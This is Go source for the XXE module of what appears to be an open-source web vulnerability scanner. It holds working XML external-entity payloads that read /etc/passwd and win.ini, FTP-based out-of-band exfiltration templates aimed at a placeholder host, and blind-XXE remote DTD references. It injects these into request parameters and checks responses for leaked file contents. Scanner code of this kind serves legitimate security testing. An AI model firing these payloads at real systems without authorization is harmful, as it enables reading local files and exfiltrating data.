package xxe

import (
	"github.com/thoas/go-funk"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/input"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/output"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"github.com/yhy0/logging"
	"strings"
	"sync"
	"time"
)

/**
  @author: yhy
  @since: 2023/1/5
  @desc: //TODO
**/

var ftp_template = `<!ENTITY % bbb SYSTEM "file:///tmp/"><!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'ftp://fakeuser:%bbb;@%HOSTNAME%:%FTP_PORT%/b'>">`
var ftp_client_file_template = `<!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'ftp://fakeuser:%bbb;@%HOSTNAME%:%FTP_PORT%/b'>">`

// bind-xxe
var reverse_template = []string{
	`<!DOCTYPE convert [<!ENTITY % remote SYSTEM "%s">%remote;]>`,
	`<!DOCTYPE uuu SYSTEM "%s">`,
}

var payloads = []string{
	`<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>`,
	`<?xml version="1.0" ?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>`,
	`<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///c:/windows/win.ini">]>`,
	`<?xml version = "1.0"?><!DOCTYPE ANY [      <!ENTITY f SYSTEM "file:///C://Windows//win.ini">  ]><x>&f;</x>`,
}

type Plugin struct {
	SeenRequests sync.Map
}

func (p *Plugin) Scan(target string, path string, in *input.CrawlResult, client *httpx.Client) {
	if !strings.Contains(in.Headers["Content-Type"], "application/xml") {
		return
	}
	if p.IsScanned(in.UniqueId) {
		return
	}
	res, payload, isVul := startTesting(in, client)
	if isVul {
		output.OutChannel <- output.VulMessage{
			DataType: "web_vul",
			Plugin:   "XXE",
			VulnData: output.VulnData{
				CreateTime: time.Now().Format("2006-01-02 15:04:05"),
				Target:     in.Url,
				Method:     in.Method,
				Ip:         in.Ip,
				Param:      in.Kv,
				Request:    res.RequestDump,
				Response:   res.ResponseDump,
				Payload:    payload,
			},
			Level: output.Critical,
		}
		return
	}

	logging.Logger.Debugln(in.Url, "xxe vulnerability not found")
}

func (p *Plugin) IsScanned(key string) bool {
	if key == "" {
		return false
	}
	if _, ok := p.SeenRequests.Load(key); ok {
		return true
	}
	p.SeenRequests.Store(key, true)
	return false
}

func (p *Plugin) Name() string {
	return "xxe"
}

func startTesting(in *input.CrawlResult, client *httpx.Client) (*httpx.Response, string, bool) {
	variations, err := httpx.ParseUri(in.Url, []byte(in.RequestBody), in.Method, in.ContentType, in.Headers)
	if err != nil {
		if strings.Contains(err.Error(), "data is empty") {
			logging.Logger.Debugln(err.Error())
		} else {
			logging.Logger.Errorln(err.Error())
		}
		return nil, "", false
	}

	if variations != nil {
		header := in.Headers
		for _, p := range variations.Params {
			for _, payload := range payloads {
				header["encode"] = "encode"
				originpayload := variations.SetPayloadByIndex(p.Index, in.Url, payload, in.Method)
				if originpayload == "" {
					continue
				}
				var res *httpx.Response
				if in.Method == "GET" {
					res, err = client.Request(originpayload, in.Method, "", header, "XXE")
				} else {
					res, err = client.Request(in.Url, in.Method, originpayload, header, "XXE")
				}

				logging.Logger.Debugln("payload:", originpayload)
				if err != nil {
					continue
				}

				if funk.Contains(res.ResponseDump, "root:x:0:0:root:/root:") || funk.Contains(res.ResponseDump, "root:[x*]:0:0:") || funk.Contains(res.ResponseDump, "; for 16-bit app support") {
					return res, originpayload, true
				}
			}
		}
	}
	return nil, "", false
}
